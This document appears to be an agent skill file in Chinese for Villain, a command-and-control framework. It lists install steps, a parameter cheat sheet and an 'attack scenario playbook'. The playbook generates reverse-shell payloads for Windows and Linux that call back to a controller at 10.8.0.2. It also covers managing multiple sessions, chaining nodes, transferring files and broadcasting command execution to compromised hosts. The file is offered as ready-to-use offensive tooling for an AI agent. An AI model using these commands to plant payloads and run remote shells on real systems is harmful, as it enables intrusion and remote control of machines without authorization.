---
name: villain-c2-shells
description: 渗透工具 skill:Villain 的安装、参数速查与攻击场景 playbook。当任务涉及 远程命令执行与WebShell 需要调用 Villain 时使用。
---

# Villain

- 攻击大类:C13 远程命令执行与WebShell
- 上游仓库:https://github.com/t3l3machus/Villain
- 上游 License:BSD-2-Clause(需人工确认)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/t3l3machus/Villain && cd Villain && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./Villain.py -p 4443` | 起主控 |
| `-x 10.8.0.2:4443` | 级联节点 |
| `generate os=windows lhost=10.8.0.2` | 生成 payload |
| `shell` | 交互 shell |
| `upload/download` | 文件传输 |
| `exec` | 广播执行 |

## 攻击场景 Playbook

### 多会话 shell 托管

```bash
./Villain.py -p 4443
Villain > generate os=linux lhost=10.8.0.2
# 会话自动回连主控,支持多节点级联与兄弟会话共享
```

## 注意事项

hoaxshell 同作者的会话管理升级版;多目标反弹集中管理,加密通信。
